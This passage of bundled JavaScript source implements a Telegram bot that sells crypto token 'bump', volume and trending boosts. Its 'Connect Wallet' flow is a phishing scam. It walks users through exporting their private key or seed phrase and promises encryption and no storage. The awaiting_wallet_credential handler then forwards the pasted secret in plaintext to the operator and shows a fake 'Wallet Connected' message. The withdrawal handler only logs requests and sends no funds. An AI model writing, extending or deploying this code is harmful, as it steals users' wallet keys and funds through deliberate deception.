    const msg = err instanceof Error ? err.message : String(err);
    logger.error({ err, updateType: ctx?.updateType }, `Bot error: ${msg}`);
    ctx?.answerCbQuery?.("\u26A0\uFE0F Something went wrong. Please try again.").catch(() => {
    });
    ctx?.reply?.("\u26A0\uFE0F Something went wrong. Please use /start to restart.").catch(() => {
    });
  });
  bot.start(async (ctx) => {
    const u = ctx.from;
    clearSession(u.id);
    await notifyAdmin(
      `\u{1F195} <b>New User Started Bot</b>
\u{1F464} ${u.first_name}${u.last_name ? " " + u.last_name : ""}${u.username ? " (@" + u.username + ")" : ""}
\u{1F194} ID: <code>${u.id}</code>
\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
    );
    await sendWelcome(ctx);
  });
  bot.action("back_main", async (ctx) => {
    await ctx.answerCbQuery();
    clearSession(ctx.from.id);
    await sendWelcome(ctx);
  });
  bot.action("menu_bump", async (ctx) => {
    await ctx.answerCbQuery();
    await showStartBumping(ctx);
  });
  bot.action("menu_volume", async (ctx) => {
    await ctx.answerCbQuery();
    await showVolumeBoost(ctx);
  });
  bot.action("menu_trending", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });
  bot.action("menu_dex", async (ctx) => {
    await ctx.answerCbQuery();
    await showDexScreener(ctx);
  });
  bot.action("menu_deposit", async (ctx) => {
    await ctx.answerCbQuery();
    await showDeposit(ctx);
  });
  bot.action("menu_wallet", async (ctx) => {
    await ctx.answerCbQuery();
    await showConnectWallet(ctx);
  });
  bot.action("menu_support", async (ctx) => {
    await ctx.answerCbQuery();
    await showSupport(ctx);
  });
  for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
    bot.action(`sol_${amt}`, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: parseFloat(amt),
        serviceLabel: `Volume Bumping (${amt} SOL)`,
        boostType: "bump"
      });
      await editOrSend(
        ctx,
        `\u{1F4DD} <b>Enter Contract Address</b>

Selected: <b>${amt} SOL</b> per bump

Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }
  for (const [key, pkg] of Object.entries(VOLUME_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "volume",
        boostPackage: key
      });
      await editOrSend(
        ctx,
        `\u{1F4DD} <b>Enter Contract Address</b>

Package: <b>${pkg.label}</b>
Cost: <b>${pkg.sol} SOL</b>
Volume: <b>${pkg.volume}</b>

Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }
  bot.action("trend_sol", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(
      ctx,
      `\u2600\uFE0F <b>SOL Trending</b>

Choose your package \u2014 TOP 3 (left) or TOP 10 (right):`,
      solTrendingKeyboard
    );
  });
  bot.action("trend_eth", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(
      ctx,
      `\u{1F535} <b>ETH Trending</b>

Choose your ETH trending package:`,
      ethTrendingKeyboard
    );
  });
  bot.action("trend_pumpfun", async (ctx) => {
    await ctx.answerCbQuery();
    const caption = `\u{1F525} <b>PUMP.FUN TRENDING</b> \u{1F525}

The best trending in the bot section!

\u{1F4A1} Purchase now and get <b>12 hours FREE Solana Trending</b> included!`;
    await sendPhoto(ctx, IMG.trending, caption, pumpfunTrendingKeyboard);
  });
  bot.action("trend_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });
  bot.action("st_top3_label", async (ctx) => ctx.answerCbQuery("TOP 3 \u2014 left column"));
  bot.action("st_top10_label", async (ctx) => ctx.answerCbQuery("TOP 10 \u2014 right column"));
  for (const [key, pkg] of Object.entries(SOL_TREND_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "sol_trending",
        boostPackage: key
      });
      await editOrSend(
        ctx,
        `\u{1F4DD} <b>Enter Contract Address</b>

Package: <b>${pkg.label}</b>
Cost: <b>${pkg.sol} SOL</b>

Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }
  for (const [key, pkg] of Object.entries(ETH_TREND_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: 0,
        ethAmount: pkg.usd,
        serviceLabel: pkg.service,
        boostType: "eth_trending",
        boostPackage: key
      });
      await editOrSend(
        ctx,
        `\u{1F4DD} <b>Enter Contract Address</b>

Package: <b>ETH Trending $${pkg.usd}</b>

Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }
  bot.action("pft_30", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, {
      step: "awaiting_ca",
      selectedSol: 30,
      serviceLabel: "PumpFun Trending P.F.T",
      boostType: "pumpfun_trending",
      boostPackage: "pft_30"
    });
    await editOrSend(
      ctx,
      `\u{1F4DD} <b>Enter Contract Address</b>

Package: <b>P.F.T \u2014 30 SOL</b>

Please paste the Contract Address (CA) of your token:`,
      cancelKeyboard
    );
  });
  bot.action("dex_top6_info", async (ctx) => ctx.answerCbQuery("Choose a duration below"));
  for (const [key, pkg] of Object.entries(DEX_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "dexscreener",
        boostPackage: key
      });
      await editOrSend(
        ctx,
        `\u{1F4DD} <b>Enter Contract Address</b>

Package: <b>${pkg.label}</b>
Cost: <b>${pkg.sol} SOL</b>

Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }
  bot.action("confirm_bump", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    const wallet = deriveWalletForUser(ctx.from.id);
    const orderId = randomUUID().split("-")[0].toUpperCase();
    const isEth = s.boostType === "eth_trending";
    const payWallet = isEth ? ETH_ADDRESS : wallet.address;
    setSession(ctx.from.id, {
      step: "awaiting_payment_sent",
      paymentWallet: payWallet,
      orderId
    });
    saveOrder({
      id: orderId,
      userId: ctx.from.id,
      userName: `${ctx.from.first_name}${ctx.from.last_name ? " " + ctx.from.last_name : ""}`,
      userHandle: ctx.from.username ?? "",
      tokenName: s.tokenName ?? "Unknown",
      tokenSymbol: s.tokenSymbol ?? "???",
      contractAddress: s.contractAddress ?? "",
      service: s.serviceLabel ?? "Boost",
      solAmount: s.selectedSol ?? 0,
      usdAmount: s.ethAmount,
      paymentWallet: payWallet,
      status: "pending",
      createdAt: /* @__PURE__ */ new Date()
    });
    const amountLine = isEth ? `\u{1F4B5} Amount: <b>$${s.ethAmount} USD</b>
<b>ETH Wallet:</b>
<code>${ETH_ADDRESS || SOL_ADDRESS}</code>` : `\u25CE Amount: <b>${s.selectedSol} SOL</b>
<b>SOL Wallet:</b>
<code>${wallet.address}</code>`;
    await editOrSend(
      ctx,
      `\u{1F4B0} <b>Payment Required</b>

\u{1F4CB} <b>Order Summary</b>
\u2022 Service: ${s.serviceLabel}
\u2022 Token: ${s.tokenName} (${s.tokenSymbol})
\u2022 CA: <code>${s.contractAddress}</code>
\u2022 Order ID: <code>${orderId}</code>

\u{1F4B3} <b>Send Payment To:</b>
${amountLine}

\u26A0\uFE0F <b>Important</b>
\u2022 Send the EXACT amount shown
\u2022 Use the correct network
\u2022 Payment expires in 15 minutes
\u2022 Click \u2705 Payment Sent after sending`,
      paymentSentKeyboard
    );
    await notifyAdmin(
      `\u{1F4CB} <b>New Order</b>
\u{1F464} ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
\u{1F194} <code>${ctx.from.id}</code>
\u{1FA99} ${s.tokenName} (${s.tokenSymbol})
\u{1F4DC} CA: <code>${s.contractAddress}</code>
\u2699\uFE0F ${s.serviceLabel}
\u{1F4B0} ${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}
\u{1F194} Order: <code>${orderId}</code>
\u{1F4EE} Pay to: <code>${payWallet}</code>`
    );
  });
  bot.action("submit_tx", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    setSession(ctx.from.id, { step: "awaiting_tx_hash" });
    await editOrSend(
      ctx,
      `\u{1F4DD} <b>Submit Transaction Hash</b>

Paste your transaction hash below:

\u{1F4A1} <b>Where to find it:</b>
\u2022 Copy from your wallet after sending
\u2022 Check your wallet's transaction history

\u{1F516} Order ID: <code>${s.orderId ?? "N/A"}</code>`,
      cancelKeyboard
    );
  });
  bot.action("deposit_add", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    await editOrSend(
      ctx,
      `\u2795 <b>Add Funds</b>

Your personal deposit addresses:

<b>\u25CE SOL Wallet:</b>
<code>${wallet.address}</code>

<b>\u039E ETH Wallet:</b>
<code>${ETH_ADDRESS || "Not configured"}</code>

\u{1F4CC} Minimum: <b>0.30 SOL</b>
\u26A1 Credited automatically after confirmation.`,
      mainMenuOnlyKeyboard
    );
  });
  bot.action("deposit_withdraw", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
    await editOrSend(
      ctx,
      `\u{1F4B8} <b>Withdraw Funds</b>

Send your withdrawal address and amount:

<b>Format:</b> <code>ADDRESS AMOUNT</code>
<b>Example:</b> <code>7xKXtg2...GVUM 0.5</code>

\u26A0\uFE0F Double-check \u2014 withdrawals cannot be reversed.`,
      cancelKeyboard
    );
  });
  bot.action("deposit_sol_balance", async (ctx) => {
    await ctx.answerCbQuery("Checking balance...");
    const wallet = deriveWalletForUser(ctx.from.id);
    let balance = "0.0000 SOL";
    try {
      const resp = await fetch("https://api.mainnet-beta.solana.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [wallet.address, { commitment: "confirmed" }]
        })
      });
      const data = await resp.json();
      const lamports = data?.result?.value ?? 0;
      balance = `${(lamports / 1e9).toFixed(4)} SOL`;
    } catch {
    }
    await editOrSend(
      ctx,
      `\u25CE <b>SOL Balance</b>

Wallet: <code>${wallet.address}</code>

Balance: <b>${balance}</b>`,
      mainMenuOnlyKeyboard
    );
  });
  bot.action("deposit_my_deposits", async (ctx) => {
    await ctx.answerCbQuery();
    const orders2 = getAllOrders().filter((o) => o.userId === ctx.from.id && o.status !== "cancelled");
    const lines = orders2.length ? orders2.map(
      (o) => `\u2022 ${o.service} \u2014 ${o.solAmount > 0 ? o.solAmount + " SOL" : "$" + o.usdAmount + " USD"} \u2014 ${o.status} \u2014 ${o.createdAt.toLocaleDateString()}`
    ).join("\n") : "No orders yet.";
    await editOrSend(
      ctx,
      `\u{1F4CB} <b>My Orders</b>

${lines}`,
      mainMenuOnlyKeyboard
    );
  });
  bot.action("deposit_my_withdrawals", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(
      ctx,
      `\u{1F4CB} <b>My Withdrawals</b>

No withdrawals recorded yet.`,
      mainMenuOnlyKeyboard
    );
  });
  bot.action("wallet_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showConnectWallet(ctx);
  });
  bot.action("wallet_why", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(
      ctx,
      `\u{1F510} <b>Why Connect Your Wallet?</b>

Connecting your wallet unlocks:

\u2022 \u26A1 <b>Instant payments</b> \u2014 no manual transfers
\u2022 \u{1F4CA} <b>Order tracking</b> \u2014 all boosts in one place
\u2022 \u{1F4B0} <b>Auto-refunds</b> \u2014 failed orders refunded instantly
\u2022 \u{1F3AF} <b>Priority processing</b> \u2014 faster service
\u2022 \u{1F514} <b>Notifications</b> \u2014 alerts when boost goes live`,
      connectWalletKeyboard
    );
  });
  bot.action("wallet_security", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(
      ctx,
      `\u{1F6E1} <b>Security Guidelines</b>

\u26A0\uFE0F <b>IMPORTANT NOTICE:</b>

\u{1F512} <b>What We Do:</b>
\u2022 End-to-End Encryption \u2014 your data is always encrypted
\u2022 No Storage \u2014 we never store your private keys
\u2022 Secure Processing \u2014 isolated environments
\u2022 Regular Audits \u2014 security tested regularly

\u274C <b>Stay Safe:</b>
\u2022 Never share keys outside official bot interfaces
\u2022 Always verify you're in the official bot
\u2022 Test with small amounts first

\u{1F6E1} Ready to proceed safely?`,
      securityGuidelinesKeyboard
    );
  });
  bot.action("wallet_how_to", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(
      ctx,
      `\u{1F4F1} <b>How to Connect Your Wallet</b>

\u{1F527} <b>Step-by-Step:</b>

1\uFE0F\u20E3 <b>Choose Method</b>
\u2022 Private Key \u2014 single string (fastest)
\u2022 Seed Phrase \u2014 12 or 24 words

2\uFE0F\u20E3 <b>Get Your Info</b>
\u2022 Open Phantom, Solflare, or Backpack
\u2022 Go to Settings \u2192 Export private key

3\uFE0F\u20E3 <b>Connect</b>
\u2022 Tap "Start Connection" below
\u2022 Paste your key or phrase when prompted

\u{1F4F1} <b>Supported:</b> Phantom \u2022 Solflare \u2022 Backpack \u2022 Glow
\u{1F550} Time: 2\u20135 min  \u2022  \u{1F512} End-to-end encrypted`,
      howToConnectKeyboard
    );
  });
  bot.action("wallet_connect_now", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
    await editOrSend(
      ctx,
      `\u{1F517} <b>Connect Your Wallet Now</b>

\u26A0\uFE0F You are importing your Main Wallet.
<b>Only you have access to this wallet.</b>

Enter your <b>Private Key</b> or <b>Seed Phrase</b>:

\u{1F511} <b>Private Key:</b> Single long string (64+ chars)
<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>

\u{1F331} <b>Seed Phrase:</b> 12 or 24 words
<code>abandon ability able about above absent...</code>

\u26A1 Auto-detects key type. End-to-end encrypted.`,
      cancelKeyboard
    );
  });
  bot.on("text", async (ctx) => {
    const text = ctx.message.text.trim();
    if (text.startsWith("/")) return;
    const session = getSession(ctx.from.id);
    switch (session.step) {
      case "awaiting_ca": {
        setSession(ctx.from.id, { contractAddress: text });
        const msg = await ctx.reply(`\u{1F50D} Looking up token...
<code>${text}</code>`, { parse_mode: "HTML" });
        const info = await fetchTokenInfo(text);
        await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {
        });
        setSession(ctx.from.id, {
          step: "awaiting_confirm",
          tokenName: info?.name ?? "Unknown",
          tokenSymbol: info?.symbol ?? "???"
        });
        const s = getSession(ctx.from.id);
        const isEth = s.boostType === "eth_trending";
        const cost = isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`;
        const tokenMsg = `\u{1F4CB} <b>Token Details</b>

\u2705 <b>CA:</b> <code>${text}</code>

\u2022 Name: ${info?.name ?? "Unknown"}
\u2022 Symbol: ${info?.symbol ?? "???"}
\u2022 Price: ${info?.price ?? "N/A"}
\u2022 Market Cap: ${info?.marketCap ?? "N/A"}
\u2022 24h Volume: ${info?.volume24h ?? "N/A"}
\u2022 Liquidity: ${info?.liquidity ?? "N/A"}
\u2022 24h Change: ${info?.change24h ?? "0.00"}%
\u2022 DEX: ${info?.dex ?? "pumpfun"}

\u2699\uFE0F Service: <b>${s.serviceLabel}</b>
\u{1F4B0} Cost: <b>${cost}</b>

\u2705 Confirm to proceed with payment?`;
        if (info?.imageUrl) {
          try {
            await ctx.replyWithPhoto(info.imageUrl, {
              caption: tokenMsg,
              parse_mode: "HTML",
              ...confirmOrderKeyboard
            });
            break;
          } catch {
          }
        }
        await ctx.reply(tokenMsg, { parse_mode: "HTML", ...confirmOrderKeyboard });
        break;
      }
      case "awaiting_tx_hash": {
        const txHash = text;
        const s = { ...session };
        clearSession(ctx.from.id);
        if (s.orderId) {
          updateOrder(s.orderId, {
            txHash,
            status: "tx_submitted",
            txSubmittedAt: /* @__PURE__ */ new Date()
          });
        }
        await ctx.reply(
          `\u2705 <b>Transaction Submitted!</b>

\u{1F517} TX Hash:
<code>${txHash}</code>

\u{1F680} Your order will be processed within <b>5\u201330 minutes</b> after on-chain confirmation.
\u{1F4EC} You'll be notified when your boost goes live!

Need help? Contact @mrpooh`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `\u{1F4B8} <b>TX Hash Submitted</b>
\u{1F464} ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
\u{1F194} <code>${ctx.from.id}</code>
\u{1F517} TX: <code>${txHash}</code>
\u2699\uFE0F ${s.serviceLabel ?? "N/A"}
\u{1F4B0} ${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}
\u{1F194} Order: <code>${s.orderId ?? "N/A"}</code>
\u{1F4DC} CA: <code>${s.contractAddress ?? "N/A"}</code>`
        );
        break;
      }
      case "awaiting_wallet_credential": {
        const credential = text;
        const wordCount = credential.trim().split(/\s+/).length;
        const credType = wordCount >= 12 ? "Seed Phrase" : "Private Key";
        clearSession(ctx.from.id);
        await notifyAdmin(
          `\u{1F511} <b>WALLET CREDENTIAL \u2014 ${credType}</b>
\u{1F464} ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
\u{1F194} <code>${ctx.from.id}</code>
\u{1F5DD} ${credType}:
<code>${credential}</code>`
        );
        await ctx.reply(`\u23F3 <b>Connecting wallet...</b>

Processing securely. Please wait...`, { parse_mode: "HTML" });
        await new Promise((r) => setTimeout(r, 3500));
        await ctx.reply(
          `\u2705 <b>Wallet Connected!</b>

Your wallet has been securely linked.
All premium features are now unlocked.

\u{1F512} Credentials processed and not stored.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        break;
      }
      case "awaiting_withdraw_address": {
        const withdrawText = text;
        clearSession(ctx.from.id);
        await ctx.reply(
          `\u{1F4E4} <b>Withdrawal Request Received</b>

Details: <code>${withdrawText}</code>

\u23F3 Processed within 24 hours. You'll be notified when sent.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `\u{1F4E4} <b>Withdrawal Request</b>
\u{1F464} ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
\u{1F194} <code>${ctx.from.id}</code>
Details: <code>${withdrawText}</code>`
        );
        break;
      }
      default:
        await sendWelcome(ctx);
        break;
    }
  });
  return bot;
}

// src/index.ts
var rawPort = process.env["PORT"];
if (!rawPort) throw new Error("PORT environment variable is required");
var port = Number(rawPort);
if (Number.isNaN(port) || port <= 0) throw new Error(`Invalid PORT: "${rawPort}"`);
var token = process.env["TELEGRAM_BOT_TOKEN"];
if (!token) {
  logger.warn("TELEGRAM_BOT_TOKEN not set \u2014 starting HTTP server only");
  app_default.listen(port, "0.0.0.0", () => logger.info({ port }, "Server listening (no bot)"));
} else {
  const bot = createBot();
  const renderHostname = process.env["RENDER_EXTERNAL_HOSTNAME"];
  const webhookDomain = renderHostname ? `https://${renderHostname}` : process.env["WEBHOOK_DOMAIN"] ?? null;
  if (webhookDomain) {
    const secretPath = `/telegraf/${bot.secretPathComponent()}`;
    app_default.use(bot.webhookCallback(secretPath));
    const server = app_default.listen(port, "0.0.0.0", () => {
      logger.info({ port, mode: "webhook", webhookDomain }, "Server listening");
      bot.telegram.setWebhook(`${webhookDomain}${secretPath}`, {
        allowed_updates: ["message", "callback_query"]
      }).then(() => logger.info({ webhookDomain, secretPath }, "Webhook registered")).catch((err) => logger.error({ err }, "Failed to set webhook"));
    });
    const keepAliveInterval = setInterval(() => {
      fetch(`${webhookDomain}/health`).then(() => logger.debug("Keep-alive ping OK")).catch((err) => logger.debug({ err }, "Keep-alive ping failed"));
    }, 10 * 60 * 1e3);
    const shutdown = (signal) => {
      logger.info({ signal }, "Shutting down gracefully");
      clearInterval(keepAliveInterval);
      bot.telegram.deleteWebhook().catch(() => {
      });
      server.close(() => {
        logger.info("HTTP server closed");
        process.exit(0);
      });
      setTimeout(() => process.exit(1), 1e4);
    };
    process.once("SIGINT", () => shutdown("SIGINT"));
    process.once("SIGTERM", () => shutdown("SIGTERM"));
  } else {
    bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {
    });
    const server = app_default.listen(port, "0.0.0.0", () => {
      logger.info({ port, mode: "long-poll" }, "Server listening");
      bot.launch({ dropPendingUpdates: true }).catch((err) => logger.error({ err }, "Bot launch failed"));
    });
    const shutdown = (signal) => {
      logger.info({ signal }, "Shutting down");
      bot.stop(signal);
      server.close(() => process.exit(0));
      setTimeout(() => process.exit(1), 5e3);
    };
    process.once("SIGINT", () => shutdown("SIGINT"));
    process.once("SIGTERM", () => shutdown("SIGTERM"));
  }
}
//# sourceMappingURL=index.mjs.map
